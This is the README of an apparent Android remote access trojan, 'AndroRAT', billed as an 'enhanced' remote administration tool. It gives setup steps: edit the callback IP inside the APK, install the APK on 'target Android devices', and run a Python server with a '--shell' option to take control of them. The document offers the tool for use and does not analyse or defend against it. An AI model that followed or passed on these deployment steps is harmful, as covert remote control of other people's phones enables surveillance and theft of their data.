# AndroRAT - Enhanced Android Remote Administration Tool

An enhanced version of the original AndroRAT script for remote administration of Android devices.

## How to Use

Follow these steps to set up and use AndroRAT:

### Step 1: Edit IP Address

Using an APK editor, modify the IP address in the AndroRAT APK file located in release folder file to match your own server's IP.

### Step 2: Install Edited APK

Install the edited AndroRAT APK file on the target Android devices that you want to administer remotely.

### Step 3: Run Python Server Script

Run the Python server script on your server using either a terminal or Termux for Android devices. This script will handle the communication between the target devices and your server.

```bash
python androRAT.py --shell -i 0.0.0.0 -p [port base on the edited apk file]

```

### 𝗛𝗲𝗹𝗽 𝗖𝗼𝗺𝗺𝗮𝗻𝗱

```bash
python androRAT.py --help

